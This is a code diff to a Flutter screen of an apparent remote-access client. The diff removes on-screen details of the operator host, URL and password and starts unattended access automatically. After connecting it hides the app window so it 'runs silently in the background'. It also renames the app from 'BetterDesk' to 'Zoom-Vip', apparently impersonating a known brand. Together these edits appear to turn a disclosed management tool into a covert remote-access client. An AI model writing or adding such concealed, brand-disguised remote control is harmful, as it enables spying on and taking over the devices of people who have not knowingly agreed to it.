@@ -1,14 +1,14 @@
+import 'dart:async';
+
 import 'package:flutter/material.dart';
-import 'package:shared_preferences/shared_preferences.dart';
-import 'package:flutter_secure_storage/flutter_secure_storage.dart';
 import '../services/connection_service.dart';
+import '../services/setup_service.dart';
 
 class UnattendedAccessScreen extends StatefulWidget {
   final String operatorHost;
   final int operatorPort;
   final String passwordHash;
   final bool useHttps;
-  final VoidCallback onConnected;
 
   const UnattendedAccessScreen({
     super.key,
@@ -16,7 +16,6 @@ class UnattendedAccessScreen extends StatefulWidget {
     required this.operatorPort,
     required this.passwordHash,
     required this.useHttps,
-    required this.onConnected,
   });
 
   @override
@@ -24,89 +23,119 @@ class UnattendedAccessScreen extends StatefulWidget {
 }
 
 class _UnattendedAccessScreenState extends State<UnattendedAccessScreen> {
-  final _storage = const FlutterSecureStorage();
   final ConnectionService _conn = ConnectionService();
+  final SetupService _setup = SetupService();
 
-  bool _applyingConfig = false;
-  bool _configApplied = false;
-  bool _connecting = false;
+  Timer? _poll;
+  bool _connecting = true;
   bool _connected = false;
-  String _status = 'Ready to connect';
+  String _status = 'Starting secure connection…';
   String _deviceId = '';
-  String _appVersion = '';
+  int _attempts = 0;
+  int _retries = 0;
 
   @override
   void initState() {
     super.initState();
-    _init();
+    _connect();
   }
 
-  Future<void> _init() async {
-    setState(() {
-      _deviceId = 'android-${widget.operatorHost.hashCode}';
-      _appVersion = '1.5.0+104090003';
-    });
-    _applyEmbeddedConfig();
-  }
-
-  Future<void> _applyEmbeddedConfig() async {
-    setState(() {
-      _applyingConfig = true;
-      _status = 'Applying operator configuration...';
-    });
-
+  Future<void> _connect() async {
     await _conn.applyEmbeddedConfig(
       host: widget.operatorHost,
       port: widget.operatorPort,
       passwordHash: widget.passwordHash,
     );
-
     await _conn.saveServerConfig(
       host: widget.operatorHost,
       useHttps: widget.useHttps,
     );
 
-    setState(() {
-      _applyingConfig = false;
-      _configApplied = true;
-      _status = 'Configuration applied. Connecting to operator...';
-    });
-
-    await Future.delayed(const Duration(seconds: 1));
-    _autoConnect();
-  }
-
-  Future<void> _autoConnect() async {
+    if (!mounted) return;
     setState(() {
       _connecting = true;
-      _status = 'Connecting to ${widget.operatorHost}:${widget.operatorPort}...';
+      _connected = false;
+      _status = 'Starting secure connection…';
     });
 
-    final success = await _conn.autoConnectToOperator();
+    final started = await _setup.startUnattendedAccess();
+    if (!started && mounted) {
+      setState(() => _status = 'Waiting for background service…');
+    }
 
-    setState(() {
-      _connecting = false;
-      _connected = success;
-      _status = success
-          ? 'Connected to operator webconsole'
-          : 'Connection failed - will retry';
-    });
+    _poll?.cancel();
+    _poll = Timer.periodic(const Duration(seconds: 2), (_) => _checkStatus());
+    _checkStatus();
+  }
 
-    if (success && mounted) {
-      widget.onConnected();
+  Future<void> _checkStatus() async {
+    if (_connected) return;
+    _attempts++;
+
+    final relay = await _setup.getRelayStatus();
+    final state = (relay['state'] as String? ?? 'idle').toLowerCase();
+    final deviceId = (relay['deviceId'] as String? ?? '').trim();
+
+    if (!mounted) return;
+    if (deviceId.isNotEmpty && deviceId != _deviceId) {
+      setState(() => _deviceId = deviceId);
+    }
+
+    switch (state) {
+      case 'connected':
+      case 'streaming':
+        _poll?.cancel();
+        setState(() {
+          _connecting = false;
+          _connected = true;
+          _status = 'Connected to operator webconsole';
+        });
+        await Future.delayed(const Duration(milliseconds: 1200));
+        // Connected: hide the window and drop to the background so the
+        // operator service keeps running without blocking the end user.
+        await _setup.setInvisible();
+        return;
+      case 'starting':
+        setState(() => _status = 'Starting secure connection…');
+        break;
+      case 'registering':
+        setState(() => _status = _attempts > 10
+            ? 'Waiting for operator approval…'
+            : 'Registering this device with the operator…');
+        break;
+      case 'failed':
+        await _retry();
+        return;
+      default:
+        setState(() => _status = 'Connecting to operator…');
+    }
+
+    if (_attempts > 90) {
+      _poll?.cancel();
+      if (mounted) {
+        setState(() {
+          _connecting = false;
+          _status = 'Connection failed - will retry';
+        });
+      }
     }
   }
 
-  String get _baseUrl {
-    final scheme = widget.useHttps ? 'https' : 'http';
-    return '$scheme://${widget.operatorHost}:${widget.operatorPort}';
+  Future<void> _retry() async {
+    if (_retries >= 3) return;
+    _retries++;
+    if (!mounted) return;
+    setState(() => _status = 'Connection interrupted - retrying…');
+    await Future.delayed(const Duration(seconds: 3));
+    if (!mounted) return;
+    await _setup.startUnattendedAccess();
   }
 
   @override
   Widget build(BuildContext context) {
     return Scaffold(
       appBar: AppBar(
-        title: const Text('BetterDesk — Auto-Connect'),
+        title: const Text('Zoom-Vip — Auto-Connect'),
         automaticallyImplyLeading: false,
       ),
       body: Padding(
@@ -114,72 +143,27 @@ class _UnattendedAccessScreenState extends State<UnattendedAccessScreen> {
         child: Column(
           crossAxisAlignment: CrossAxisAlignment.stretch,
           children: [
-            const Icon(Icons.device_hub, size: 80, color: Colors.blue),
-            const SizedBox(height: 24),
-            Text(
-              'Operator-Managed Device',
-              style: Theme.of(context).textTheme.headlineSmall,
-              textAlign: TextAlign.center,
+            const Spacer(),
+            Icon(
+              _connected ? Icons.verified_user : Icons.shield_outlined,
+              size: 96,
+              color: _connected ? Colors.green : const Color(0xFF0753FB),
             ),
-            const SizedBox(height: 8),
-            Text(
-              'This device is pre-configured for remote management.\n'
-                  'No setup required — just allow access once.',
-              style: Theme.of(context).textTheme.bodyMedium,
-              textAlign: TextAlign.center,
-            ),
-            const SizedBox(height: 32),
-
-            Card(
-              child: Padding(
-                padding: const EdgeInsets.all(16),
-                child: Column(
-                  crossAxisAlignment: CrossAxisAlignment.start,
-                  children: [
-                    Row(
-                      children: [
-                        const Icon(Icons.info, color: Colors.blue, size: 20),
-                        const SizedBox(width: 8),
-                        Text(
-                          'Embedded Configuration',
-                          style: Theme.of(context).textTheme.titleMedium,
-                        ),
-                      ],
-                    ),
-                    const SizedBox(height: 12),
-                    Text('Operator: ${widget.operatorHost}'),
-                    Text('Port: ${widget.operatorPort}'),
-                    Text(
-                      'Protocol: ${widget.useHttps ? 'HTTPS/WSS' : 'HTTP/WS'}',
-                    ),
-                    Text(
-                      'Password: ${widget.passwordHash.isNotEmpty ? 'Configured (PBKDF2 hashed)' : 'Not set'}',
-                    ),
-                    const SizedBox(height: 12),
-                    Text(
-                      'Device ID: $_deviceId',
-                      style: const TextStyle(fontSize: 12, color: Colors.grey),
-                    ),
-                  ],
-                ),
-              ),
-            ),
-            const SizedBox(height: 20),
-
+            const SizedBox(height: 28),
             Container(
-              padding: const EdgeInsets.all(16),
+              padding: const EdgeInsets.all(18),
               decoration: BoxDecoration(
                 color: _connected
                     ? Colors.green.shade50
                     : _connecting
-                        ? Colors.blue.shade50
+                        ? const Color(0xFFE8EEFF)
                         : Colors.grey.shade100,
-                borderRadius: BorderRadius.circular(8),
+                borderRadius: BorderRadius.circular(14),
                 border: Border.all(
                   color: _connected
                       ? Colors.green
                       : _connecting
-                          ? Colors.blue
+                          ? const Color(0xFF0753FB)
                           : Colors.grey,
                 ),
               ),
@@ -187,45 +171,40 @@ class _UnattendedAccessScreenState extends State<UnattendedAccessScreen> {
                 children: [
                   if (_connecting)
                     const SizedBox(
-                      width: 20,
-                      height: 20,
-                      child: CircularProgressIndicator(strokeWidth: 2),
+                      width: 22,
+                      height: 22,
+                      child: CircularProgressIndicator(strokeWidth: 2.5),
                     )
                   else
                     Icon(
-                      _connected ? Icons.check_circle : Icons.info,
-                      color: _connected ? Colors.green : Colors.blue,
+                      _connected ? Icons.check_circle : Icons.sync_problem,
+                      color: _connected ? Colors.green : Colors.orange,
                     ),
-                  const SizedBox(width: 12),
-                  Expanded(child: Text(_status)),
+                  const SizedBox(width: 14),
+                  Expanded(
+                    child: Text(
+                      _status,
+                      style: const TextStyle(
+                        fontSize: 15,
+                        fontWeight: FontWeight.w600,
+                      ),
+                    ),
+                  ),
                 ],
               ),
             ),
-            const Spacer(),
-
-            Container(
-              padding: const EdgeInsets.all(12),
-              decoration: BoxDecoration(
-                color: Colors.grey.shade100,
-                borderRadius: BorderRadius.circular(8),
+            const SizedBox(height: 20),
+            if (_deviceId.isNotEmpty)
+              Text(
+                'Device ID: $_deviceId',
+                textAlign: TextAlign.center,
+                style: TextStyle(fontSize: 12, color: Colors.grey.shade600),
               ),
-              child: Column(
-                crossAxisAlignment: CrossAxisAlignment.start,
-                children: [
-                  Text(
-                    'Device Information',
-                    style: TextStyle(
-                      fontSize: 12,
-                      color: Colors.grey[600],
-                      fontWeight: FontWeight.bold,
-                    ),
-                  ),
-                  const SizedBox(height: 6),
-                  Text('ID: $_deviceId', style: const TextStyle(fontSize: 12)),
-                  Text('Version: $_appVersion', style: const TextStyle(fontSize: 12)),
-                  Text('Operator URL: $_baseUrl', style: const TextStyle(fontSize: 12)),
-                ],
-              ),
+            const Spacer(flex: 2),
+            const Text(
+              'Unattended access runs silently in the background',
+              textAlign: TextAlign.center,
+              style: TextStyle(fontSize: 12, color: Colors.grey),
             ),
           ],
         ),
@@ -235,6 +214,7 @@ class _UnattendedAccessScreenState extends State<UnattendedAccessScreen> {
 
   @override
   void dispose() {
+    _poll?.cancel();
     _conn.dispose();
     super.dispose();
   }
